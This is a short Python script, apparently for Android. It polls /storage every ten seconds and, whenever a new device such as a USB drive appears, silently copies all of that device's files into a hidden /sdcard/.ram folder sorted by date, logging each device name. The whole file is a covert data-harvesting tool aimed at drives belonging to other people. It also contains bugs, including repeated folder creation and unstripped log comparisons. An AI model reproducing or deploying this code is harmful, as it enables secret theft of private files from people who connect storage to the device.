# Modules
import os
from time import sleep,strftime


my_dir = ("emulated","self") # edit it if you have ather files in /


try: # You need run it one times
    os.mkdir("/sdcard/.ram") # save file usb here
except FileExistsError:
    skep = ""


while True:

    sleep(10)
    time = strftime("%Y-%m-%d")
    fa,fr = open("/sdcard/.ram/name_usb.txt","a"),open("/sdcard/.ram/name_usb.txt","r")
    os.chdir("/storage")
    list_dir = os.listdir()

    for file in list_dir:
        if file not in my_dir and file not in fr.readlines():

            os.mkdir(f"/sdcard/.ram/{time}")
            os.mkdir(f"/sdcard/.ram/{time}/{file}")
            os.chdir("/storage")
            os.chdir(file)

            if os.getcwd() == f"/storage/{file}":
                os.system(f"cp -r * /sdcard/.ram/{time}/{file}")
                fa.writelines(file)
